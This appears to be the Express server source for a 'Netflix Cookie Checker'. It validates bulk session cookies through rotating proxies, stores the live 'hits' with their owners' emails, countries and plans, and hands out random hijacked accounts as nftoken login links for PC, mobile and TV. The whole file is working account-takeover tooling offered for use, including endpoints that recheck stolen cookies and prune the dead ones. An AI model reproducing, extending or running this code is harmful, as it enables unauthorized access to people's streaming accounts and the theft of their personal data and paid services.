import express from "express";
import cors from "cors";
import path from "path";
import { fileURLToPath } from "url";
import crypto from "crypto";
import {
  initDatabase,
  isDbAvailable,
  createRun,
  getRuns,
  getRun,
  getRunResults,
  deleteRun,
  getStats,
  getAllHitsResults,
  countAllHitsResults,
  updateResult,
  deleteResultById,
  deleteDuplicates,
  deduplicateHits,
  deduplicateSuccessFreeHits,
  getCountryBreakdown,
  getHitLogs,
  countHits,
  getResultById,
  getLatestResultByEmail,
  getLatestResultByCookieContent,
  onDashboardUpdate,
  notifyDashboardUpdate,
  searchHitLogs,
  getHitLogFilters,
  recordGeneration,
  getGenerationHistory,
  countGenerationHistory,
  countStaleHits,
} from "./db.js";
import { runCheck } from "./checker.js";
import { parseProxies } from "./proxy.js";
import { DEFAULT_CONFIG, mergeConfig } from "./config.js";
import { buildNfTokenLinks } from "./nftoken.js";
import type { AppConfig, ProgressUpdate } from "./types.js";
import {
  startHealthMonitor,
  stopHealthMonitor,
  getHealthMonitorStatus,
  runHealthCheck,
  cleanupStaleHits,
  type HealthMonitorOptions,
} from "./health-monitor.js";
import {
  startProxyAutoFetch,
  stopProxyAutoFetch,
  getProxyPoolStatus,
  refreshProxies,
} from "./proxy-manager.js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 8080;

app.use(cors());
app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ extended: true, limit: "50mb" }));

// Active SSE connections per run
const sseClients = new Map<string, Set<express.Response>>();

// Last known progress per run — sent immediately to reconnecting clients
const lastProgress = new Map<string, ProgressUpdate>();

function sendSse(runId: string, data: ProgressUpdate) {
  // Store the latest progress/complete/error so reconnects get instant state
  if (data.type === "progress" || data.type === "complete" || data.type === "error") {
    lastProgress.set(runId, data);
  }
  const clients = sseClients.get(runId);
  if (clients) {
    const message = `data: ${JSON.stringify(data)}\n\n`;
    for (const res of clients) {
      try {
        res.write(message);
      } catch {
        clients.delete(res);
      }
    }
  }
}

// Active runs (for cancellation)
const activeRuns = new Map<string, AbortController>();

// Global dashboard SSE clients
const dashboardSseClients = new Set<express.Response>();

onDashboardUpdate(() => {
  const message = `data: ${JSON.stringify({ type: "dashboard-update" })}
\n`;
  for (const res of dashboardSseClients) {
    try {
      res.write(message);
    } catch {
      dashboardSseClients.delete(res);
    }
  }
});

// ---- API Routes ----

// Global dashboard SSE stream
app.get("/api/events", (req, res) => {
  res.writeHead(200, {
    "Content-Type": "text/event-stream",
    "Cache-Control": "no-cache",
    Connection: "keep-alive",
    "Access-Control-Allow-Origin": "*",
  });
  res.write("data: {\"type\":\"connected\"}\n\n");
  dashboardSseClients.add(res);
  req.on("close", () => {
    dashboardSseClients.delete(res);
  });
});

// Health check
app.get("/api/health", async (_req, res) => {
  const dbOk = await isDbAvailable().catch(() => false);
  res.json({
    status: "ok",
    database: dbOk ? "connected" : "unavailable",
    activeRuns: activeRuns.size,
    healthMonitor: getHealthMonitorStatus(),
  });
});

// Get default config
app.get("/api/config", (_req, res) => {
  res.json(DEFAULT_CONFIG);
});

// Start a check run
app.post("/api/check", async (req, res) => {
  try {
    const {
      cookies,
      proxies: proxyText,
      config: userConfig,
      threads,
    } = req.body as {
      cookies: Array<{ name: string; content: string }>;
      proxies?: string;
      config?: Partial<AppConfig>;
      threads?: number;
    };

    if (!cookies || !Array.isArray(cookies) || cookies.length === 0) {
      res.status(400).json({ error: "No cookies provided" });
      return;
    }

    const config = userConfig ? mergeConfig(DEFAULT_CONFIG, userConfig) : DEFAULT_CONFIG;
    const proxies = proxyText ? parseProxies(proxyText) : [];
    const threadCount = Math.min(Math.max(threads || 30, 1), 300);
    const runId = crypto.randomUUID();

    // Create DB run record
    await createRun(runId, cookies.length, config).catch(() => {});

    const abortController = new AbortController();
    activeRuns.set(runId, abortController);

    // Start the check in background
    runCheck({
      config,
      cookies,
      proxies,
      threadCount,
      runId,
      signal: abortController.signal,
      onProgress: (update) => {
        sendSse(runId, update);
      },
    })
      .then(() => {
        activeRuns.delete(runId);
        // Clean up progress cache after 5 minutes
        setTimeout(() => lastProgress.delete(runId), 5 * 60 * 1000);
      })
      .catch((err) => {
        console.error(`Run ${runId} error:`, err);
        activeRuns.delete(runId);
        sendSse(runId, { type: "error", runId, message: String(err?.message || err) });
        setTimeout(() => lastProgress.delete(runId), 5 * 60 * 1000);
      });

    res.json({ runId, total: cookies.length, threads: threadCount });
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Internal server error" });
  }
});

// SSE stream for a run
app.get("/api/check/:runId/stream", (req, res) => {
  const runId = req.params.runId;

  res.writeHead(200, {
    "Content-Type": "text/event-stream",
    "Cache-Control": "no-cache",
    Connection: "keep-alive",
    "Access-Control-Allow-Origin": "*",
  });

  res.write("data: {\"type\":\"connected\",\"runId\":\"" + runId + "\"}\n\n");

  // Send the last known progress to this client immediately (reconnect support)
  const last = lastProgress.get(runId);
  if (last) {
    res.write(`data: ${JSON.stringify(last)}\n\n`);
  }

  if (!sseClients.has(runId)) {
    sseClients.set(runId, new Set());
  }
  sseClients.get(runId)!.add(res);

  req.on("close", () => {
    sseClients.get(runId)?.delete(res);
    if (sseClients.get(runId)?.size === 0) {
      sseClients.delete(runId);
    }
  });
});

// Get active run status (for checking if a run is still going)
app.get("/api/check/:runId/status", (req, res) => {
  const runId = req.params.runId;
  const isActive = activeRuns.has(runId);
  const last = lastProgress.get(runId);
  res.json({
    active: isActive,
    progress: last || null,
  });
});

// Cancel a run
app.post("/api/check/:runId/cancel", (req, res) => {
  const runId = req.params.runId;
  const controller = activeRuns.get(runId);
  if (controller) {
    controller.abort();
    activeRuns.delete(runId);
    res.json({ success: true, message: "Run cancelled" });
  } else {
    res.status(404).json({ error: "Run not found or already completed" });
  }
});

// Recheck all stored hits in the database
app.post("/api/recheck", async (req, res) => {
  try {
    const { proxies: proxyText, config: userConfig, threads } = req.body as {
      proxies?: string;
      config?: Partial<AppConfig>;
      threads?: number;
    };

    const config = userConfig ? mergeConfig(DEFAULT_CONFIG, userConfig) : DEFAULT_CONFIG;
    const proxies = proxyText ? parseProxies(proxyText) : [];
    const threadCount = Math.min(Math.max(threads || 30, 1), 300);
    const runId = crypto.randomUUID();

    // Fetch all stored hits with cookie content
    const totalHits = await countAllHitsResults();
    if (totalHits === 0) {
      res.status(400).json({ error: "No stored hits to recheck" });
      return;
    }

    const storedHits = await getAllHitsResults(5000, 0);

    // Create DB run record for the recheck
    await createRun(runId, storedHits.length, config).catch(() => {});

    const abortController = new AbortController();
    activeRuns.set(runId, abortController);

    // Build cookie list from stored hit results
    const cookies = storedHits.map((r) => ({ name: r.email || `result_${r.id}`, content: r.cookie_content! }));

    // Use the existing runCheck with stored cookie content
    runCheck({
      config,
      cookies,
      proxies,
      threadCount,
      runId,
      signal: abortController.signal,
      onProgress: (update) => {
        sendSse(runId, update);
      },
    })
      .then(() => {
        activeRuns.delete(runId);
        setTimeout(() => lastProgress.delete(runId), 5 * 60 * 1000);
      })
      .catch((err) => {
        console.error(`Recheck ${runId} error:`, err);
        activeRuns.delete(runId);
        sendSse(runId, { type: "error", runId, message: String(err?.message || err) });
        setTimeout(() => lastProgress.delete(runId), 5 * 60 * 1000);
      });

    res.json({ runId, total: storedHits.length, threads: threadCount, recheck: true });
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Failed to start recheck" });
  }
});

// Get count of stored hits available for recheck
app.get("/api/recheck/count", async (_req, res) => {
  try {
    const count = await countAllHitsResults();
    res.json({ count });
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Failed to count hits" });
  }
});

// Generate a single account from a random stored hit, recheck it, and return full details
app.post("/api/generate-account", async (req, res) => {
  try {
    const { proxies: proxyText, config: userConfig, threads, excludeId, country, plan } = req.body as {
      proxies?: string;
      config?: Partial<AppConfig>;
      threads?: number;
      excludeId?: number;
      country?: string;
      plan?: string;
    };

    const config = userConfig ? mergeConfig(DEFAULT_CONFIG, userConfig) : DEFAULT_CONFIG;
    const proxies = proxyText ? parseProxies(proxyText) : [];
    const threadCount = Math.min(Math.max(threads || 30, 1), 300);

    // Get all stored hits
    const totalHits = await countAllHitsResults();
    if (totalHits === 0) {
      res.status(400).json({ error: "No stored hits to generate from" });
      return;
    }

    const storedHits = await getAllHitsResults(5000, 0);
    let candidates = storedHits;
    // Filter by country if specified
    if (country && country !== "all") {
      candidates = candidates.filter((h) => h.country && h.country.toLowerCase() === country.toLowerCase());
    }
    // Filter by plan if specified
    if (plan && plan !== "all") {
      candidates = candidates.filter((h) =>
        (h.plan_key && h.plan_key === plan) ||
        (h.plan_name && h.plan_name.toLowerCase().includes(plan.toLowerCase()))
      );
    }
    if (excludeId && candidates.length > 1) {
      candidates = candidates.filter((h) => h.id !== excludeId);
    }
    if (candidates.length === 0) {
      res.status(400).json({ error: "No other stored hits to generate from" });
      return;
    }
    // Pick a random hit, excluding the current one when possible
    const randomHit = candidates[Math.floor(Math.random() * candidates.length)];
    const storedAccountInfo = (randomHit.account_info || {}) as Record<string, any>;

    const runId = crypto.randomUUID();
    await createRun(runId, 1, config).catch(() => {});

    const abortController = new AbortController();
    activeRuns.set(runId, abortController);

    const cookies = [{ name: randomHit.email || `result_${randomHit.id}`, content: randomHit.cookie_content! }];

    // Run the check and collect results
    let checkResult: any = null;
    let checkError: string | null = null;

    try {
      const stats = await runCheck({
        config,
        cookies,
        proxies,
        threadCount,
        runId,
        signal: abortController.signal,
        onProgress: (update) => {
          if (update.type === "result") {
            checkResult = update;
          }
        },
      });
      void stats;
    } catch (err: any) {
      checkError = String(err?.message || err);
    }

    activeRuns.delete(runId);

    if (checkError) {
      res.status(500).json({ error: checkError });
      return;
    }

    if (!checkResult) {
      res.status(500).json({ error: "No result from recheck" });
      return;
    }

    // Merge stored account info with recheck info so the modal always has data.
    // If the recheck didn't carry accountInfo, fetch the latest saved DB row for this account.
    let recheckAccountInfo = checkResult.accountInfo || {};
    if (!recheckAccountInfo || Object.keys(recheckAccountInfo).length === 0) {
      const savedResult =
        (checkResult.email && (await getLatestResultByEmail(checkResult.email))) ||
        (randomHit.email && (await getLatestResultByEmail(randomHit.email))) ||
        (await getLatestResultByCookieContent(randomHit.cookie_content!));
      if (savedResult?.account_info) {
        recheckAccountInfo = savedResult.account_info as Record<string, any>;
      }
    }

    const mergedAccountInfo = { ...storedAccountInfo, ...recheckAccountInfo };
    // Ensure email/country/plan from the recheck or stored data are present
    if (!mergedAccountInfo.email && (checkResult.email || randomHit.email)) {
      mergedAccountInfo.email = checkResult.email || randomHit.email;
    }
    if (!mergedAccountInfo.countryOfSignup && (checkResult.country || randomHit.country)) {
      mergedAccountInfo.countryOfSignup = checkResult.country || randomHit.country;
    }
    if (!mergedAccountInfo.localizedPlanName && (checkResult.planName || randomHit.plan_name)) {
      mergedAccountInfo.localizedPlanName = checkResult.planName || randomHit.plan_name;
    }
    if (!mergedAccountInfo.planKey && (checkResult.planKey || randomHit.plan_key)) {
      mergedAccountInfo.planKey = checkResult.planKey || randomHit.plan_key;
    }
    if (!mergedAccountInfo.membershipStatus && (checkResult.status || randomHit.status)) {
      mergedAccountInfo.membershipStatus = checkResult.status === "success" ? "Active" : (checkResult.status || randomHit.status);
    }

    // Build nftoken links - prefer fresh token, fall back to stored token
    let nfTokenData = checkResult.nfTokenData || randomHit.nftoken_data || null;
    let nfTokenLinks: Array<[string, string]> = [];
    if (nfTokenData && nfTokenData.token) {
      const mode = String(config.nftoken) === "true" ? "both" : String(config.nftoken);
      nfTokenLinks = buildNfTokenLinks(nfTokenData.token, mode);
    }

    // Always include all device links if a token is available
    if (nfTokenData && nfTokenData.token) {
      const token = nfTokenData.token;
      nfTokenLinks = [
        ["🖥️ PC Login", `https://netflix.com/?nftoken=${token}`],
        ["📱 Mobile Login", `https://netflix.com/unsupported?nftoken=${token}`],
        ["📺 TV Login", `https://www.netflix.com/activate?nftoken=${token}`],
      ];
    }

    const isLive = checkResult.status === "success";

    // Auto-delete free accounts from the database
    if (checkResult.status === "free") {
      await deleteResultById(randomHit.id).catch(() => {});
    }

    // Record generation history
    await recordGeneration(randomHit.id, {
      status: checkResult.status,
      planKey: checkResult.planKey || randomHit.plan_key || undefined,
      planName: checkResult.planName || randomHit.plan_name || undefined,
      country: checkResult.country || randomHit.country || undefined,
      email: checkResult.email || randomHit.email || undefined,
      reason: checkResult.reason,
      accountInfo: mergedAccountInfo,
    }).catch(() => {});

    res.json({
      runId,
      storedHitId: randomHit.id,
      result: {
        status: checkResult.status,
        planKey: checkResult.planKey || randomHit.plan_key || undefined,
        planName: checkResult.planName || randomHit.plan_name || undefined,
        country: checkResult.country || randomHit.country || undefined,
        email: checkResult.email || randomHit.email || undefined,
        reason: checkResult.reason,
        onHold: checkResult.onHold,
        accountInfo: mergedAccountInfo,
        cookieContent: checkResult.cookieContent || randomHit.cookie_content || undefined,
        formattedOutput: checkResult.formattedOutput || randomHit.formatted_output || undefined,
        nfTokenData: nfTokenData,
        nfTokenLinks,
        isLive,
        proxyIp: checkResult.proxyIp || null,
      },
    });
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Failed to generate account" });
  }
});

// Recheck a single stored hit by ID
app.post("/api/recheck/:id", async (req, res) => {
  try {
    const id = parseInt(req.params.id);
    if (isNaN(id)) {
      res.status(400).json({ error: "Invalid ID" });
      return;
    }

    const result = await getResultById(id);
    if (!result || !result.cookie_content) {
      res.status(404).json({ error: "Hit not found or has no cookie content" });
      return;
    }

    const { proxies: proxyText, config: userConfig, threads, autoDelete } = req.body as {
      proxies?: string;
      config?: Partial<AppConfig>;
      threads?: number;
      autoDelete?: boolean;
    };

    const config = userConfig ? mergeConfig(DEFAULT_CONFIG, userConfig) : DEFAULT_CONFIG;
    const proxies = proxyText ? parseProxies(proxyText) : [];
    const threadCount = Math.min(Math.max(threads || 30, 1), 300);
    const runId = crypto.randomUUID();

    await createRun(runId, 1, config).catch(() => {});
    const abortController = new AbortController();
    activeRuns.set(runId, abortController);

    let checkResult: any = null;

    await runCheck({
      config,
      cookies: [{ name: result.email || `result_${result.id}`, content: result.cookie_content, resultId: result.id }],
      proxies,
      threadCount,
      runId,
      signal: abortController.signal,
      onProgress: (update) => {
        if (update.type === "result") {
          checkResult = update;
        }
      },
    });

    activeRuns.delete(runId);

    if (!checkResult) {
      res.status(500).json({ error: "No result from recheck" });
      return;
    }

    const isLive = checkResult.status === "success";
    if (isLive) {
      await updateResult(id, checkResult);
    } else if (autoDelete) {
      await deleteResultById(id);
    } else {
      await updateResult(id, checkResult);
    }

    res.json({
      id,
      isLive,
      status: checkResult.status,
      reason: checkResult.reason,
      autoDeleted: !isLive && autoDelete,
      proxyIp: checkResult.proxyIp || null,
    });
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Failed to recheck hit" });
  }
});

// Get country breakdown of hits
app.get("/api/country-breakdown", async (_req, res) => {
  try {
    const breakdown = await getCountryBreakdown();
    res.json(breakdown);
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Failed to fetch country breakdown" });
  }
});

// Get hit logs (recent stored hits)
app.get("/api/hit-logs", async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit as string) || 50, 500);
    const offset = parseInt(req.query.offset as string) || 0;
    const logs = await getHitLogs(limit, offset);
    const total = await countHits();
    res.json({ logs, total });
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Failed to fetch hit logs" });
  }
});

// Search and filter hit logs
app.get("/api/hit-logs/search", async (req, res) => {
  try {
    const country = req.query.country as string | undefined;
    const plan = req.query.plan as string | undefined;
    const email = req.query.email as string | undefined;
    const limit = Math.min(parseInt(req.query.limit as string) || 50, 500);
    const offset = parseInt(req.query.offset as string) || 0;
    const { logs, total } = await searchHitLogs({ country, plan, email, limit, offset });
    res.json({ logs, total });
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Failed to search hit logs" });
  }
});

// Get filter options for hit logs
app.get("/api/hit-logs/filters", async (_req, res) => {
  try {
    const filters = await getHitLogFilters();
    res.json(filters);
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Failed to fetch filters" });
  }
});

// Deduplicate hits - auto delete duplicate cookies
app.post("/api/deduplicate", async (_req, res) => {
  try {
    const deleted = await deduplicateHits();
    const totalDeleted = await deleteDuplicates();
    const successFreeDeleted = await deduplicateSuccessFreeHits();
    const total = deleted + totalDeleted + successFreeDeleted;
    notifyDashboardUpdate();
    res.json({ deleted: total });
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Failed to deduplicate" });
  }
});

// Get a single result by ID
app.get("/api/results/:id", async (req, res) => {
  try {
    const id = parseInt(req.params.id);
    if (isNaN(id)) {
      res.status(400).json({ error: "Invalid ID" });
      return;
    }
    const result = await getResultById(id);
    if (!result) {
      res.status(404).json({ error: "Result not found" });
      return;
    }
    res.json(result);
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Failed to fetch result" });
  }
});

// Get all runs (history)
app.get("/api/runs", async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit as string) || 50, 200);
    const offset = parseInt(req.query.offset as string) || 0;
    const runs = await getRuns(limit, offset);
    res.json(runs);
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Failed to fetch runs" });
  }
});

// Get a specific run
app.get("/api/runs/:runId", async (req, res) => {
  try {
    const run = await getRun(req.params.runId);
    if (!run) {
      res.status(404).json({ error: "Run not found" });
      return;
    }
    res.json(run);
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Failed to fetch run" });
  }
});

// Get results for a run
app.get("/api/runs/:runId/results", async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit as string) || 100, 500);
    const offset = parseInt(req.query.offset as string) || 0;
    const status = req.query.status as string | undefined;
    const results = await getRunResults(req.params.runId, limit, offset, status);
    res.json(results);
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Failed to fetch results" });
  }
});

// Delete a run
app.delete("/api/runs/:runId", async (req, res) => {
  try {
    await deleteRun(req.params.runId);
    res.json({ success: true });
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Failed to delete run" });
  }
});

// Get overall stats
app.get("/api/stats", async (_req, res) => {
  try {
    const stats = await getStats();
    res.json(stats);
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Failed to fetch stats" });
  }
});

// Get stale hits count
app.get("/api/stale-hits", async (req, res) => {
  try {
    const days = Math.min(Math.max(parseInt(req.query.days as string) || 7, 1), 90);
    const count = await countStaleHits(days);
    res.json({ count, days });
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Failed to fetch stale hits" });
  }
});

// Trigger stale hit cleanup
app.post("/api/stale-hits/cleanup", async (req, res) => {
  try {
    const { days, autoDelete } = req.body as { days?: number; autoDelete?: boolean };
    const staleDays = Math.min(Math.max(days || 7, 1), 90);
    const summary = await cleanupStaleHits(staleDays, autoDelete !== false);
    res.json(summary);
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Failed to cleanup stale hits" });
  }
});

// Get account generation history
app.get("/api/generation-history", async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit as string) || 50, 500);
    const offset = parseInt(req.query.offset as string) || 0;
    const history = await getGenerationHistory(limit, offset);
    const total = await countGenerationHistory();
    res.json({ history, total });
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Failed to fetch generation history" });
  }
});

// Health monitor control
app.get("/api/health-monitor", async (_req, res) => {
  try {
    res.json({ status: getHealthMonitorStatus() });
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Failed to fetch health monitor status" });
  }
});

app.post("/api/health-monitor", async (req, res) => {
  try {
    const { enabled, intervalHours, deleteDeadCookies, threads } = req.body as {
      enabled?: boolean;
      intervalHours?: number;
      deleteDeadCookies?: boolean;
      threads?: number;
    };

    if (enabled === false) {
      stopHealthMonitor();
      res.json({ status: getHealthMonitorStatus() });
      return;
    }

    const options: HealthMonitorOptions = {
      intervalHours: Math.min(Math.max(intervalHours || 24, 1), 168),
      deleteDeadCookies: deleteDeadCookies !== false,
      threads: Math.min(Math.max(threads || 30, 1), 300),
      onComplete: (summary) => {
        console.log("Health monitor completed:", summary);
      },
      onError: (error) => {
        console.error("Health monitor error:", error);
      },
    };

    startHealthMonitor(options);
    res.json({ status: getHealthMonitorStatus() });
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Failed to configure health monitor" });
  }
});

app.post("/api/health-monitor/run-now", async (req, res) => {
  try {
    const { deleteDeadCookies, threads } = req.body as {
      deleteDeadCookies?: boolean;
      threads?: number;
    };
    const options: HealthMonitorOptions = {
      intervalHours: 0,
      deleteDeadCookies: deleteDeadCookies !== false,
      threads: Math.min(Math.max(threads || 30, 1), 300),
    };
    const summary = await runHealthCheck(options);
    res.json(summary);
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Failed to run health check" });
  }
});

// ---- Proxy Management ----

// Get proxy pool status
app.get("/api/proxies/status", (_req, res) => {
  res.json(getProxyPoolStatus());
});

// Force refresh proxies
app.post("/api/proxies/refresh", async (_req, res) => {
  try {
    const result = await refreshProxies();
    res.json({ ...result, message: `Fetched ${result.fetched} proxies, ${result.alive} alive` });
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Failed to refresh proxies" });
  }
});

// Serve static files in production
// Server is compiled to web/dist/server/index.js, so the frontend build is at web/dist/
const distPath = path.resolve(__dirname, "..");
app.use(express.static(distPath));

// Catch-all for SPA routing (Express 5 compatible)
app.use((req, res, next) => {
  if (req.method !== "GET" || req.path.startsWith("/api/")) {
    next();
    return;
  }
  res.sendFile(path.join(distPath, "index.html"));
});

// Start server
async function start() {
  try {
    await initDatabase();
    console.log("Database initialized successfully");
  } catch (err) {
    console.warn("Database initialization failed (will retry on first query):", err);
  }

  // Start proxy auto-fetch on boot so validated proxies are always available
  startProxyAutoFetch();
  console.log("Proxy auto-fetch started — fetching from monosans/proxy-list");

  // Start auto-health monitor with defaults from environment
  const monitorEnabled = process.env.HEALTH_MONITOR_ENABLED === "true";
  if (monitorEnabled) {
    const intervalHours = parseInt(process.env.HEALTH_MONITOR_INTERVAL_HOURS || "24", 10);
    const deleteDeadCookies = process.env.HEALTH_MONITOR_DELETE_DEAD !== "false";
    const threads = parseInt(process.env.HEALTH_MONITOR_THREADS || "30", 10);
    startHealthMonitor({
      intervalHours,
      deleteDeadCookies,
      threads,
      onComplete: (summary) => {
        console.log("Health monitor completed:", summary);
      },
      onError: (error) => {
        console.error("Health monitor error:", error);
      },
    });
  }

  app.listen(PORT, () => {
    console.log(`Netflix Cookie Checker server running on port ${PORT}`);
  });
}

start();
